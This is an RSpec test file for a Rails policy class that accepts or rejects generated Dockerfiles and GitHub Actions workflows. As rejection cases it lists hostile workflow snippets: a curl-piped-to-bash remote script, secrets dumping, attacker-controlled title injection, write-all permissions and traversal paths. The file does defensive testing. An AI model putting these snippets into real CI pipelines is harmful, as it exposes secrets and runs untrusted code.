require "rails_helper"

RSpec.describe Security::GeneratedFilePolicy do
  let(:safe_workflow) do
    <<~YAML
      name: Deploy
      on:
        push:
          branches: [main]
      permissions:
        contents: read
        id-token: write
      jobs:
        deploy:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
            - run: echo "deploying ${{ github.sha }}"
    YAML
  end

  def violations(files)
    described_class.violations(files)
  end

  it "accepts the expected CI/CD files" do
    files = [
      { "path" => "Dockerfile", "content" => "FROM ruby:3.4" },
      { "path" => ".dockerignore", "content" => ".git\n" },
      { path: ".github/workflows/deploy.yml", content: safe_workflow }
    ]
    expect(violations(files)).to be_empty
  end

  it "rejects paths outside the allowlist" do
    %w[
      app/models/user.rb
      config/initializers/backdoor.rb
      .github/workflows/../../app.rb
      /etc/passwd
      .github/actions/evil/action.yml
      .github/workflows/sub/dir.yml
      Gemfile
    ].each do |path|
      expect(violations([ { "path" => path, "content" => "x" } ])).not_to be_empty, path
    end
  end

  it "rejects dangerous workflow constructs" do
    {
      "on: pull_request_target"                                  => "pull_request_target",
      "run: echo '${{ toJSON(secrets) }}'"                        => "secrets context",
      "run: echo \"${{ github.event.pull_request.title }}\""      => "attacker-controlled",
      "run: curl -s https://x.example/install.sh | bash"          => "remote script",
      "permissions: write-all"                                   => "write-all"
    }.each do |snippet, message|
      result = violations([ { "path" => ".github/workflows/deploy.yml", "content" => "#{safe_workflow}\n#{snippet}" } ])
      expect(result.join).to include(message), snippet
    end
  end

  it "limits file count and size" do
    many = Array.new(6) { { "path" => "Dockerfile", "content" => "FROM x" } }
    expect(violations(many).join).to include("too many files")

    big = [ { "path" => "Dockerfile", "content" => "x" * (64.kilobytes + 1) } ]
    expect(violations(big).join).to include("too large")
  end
end
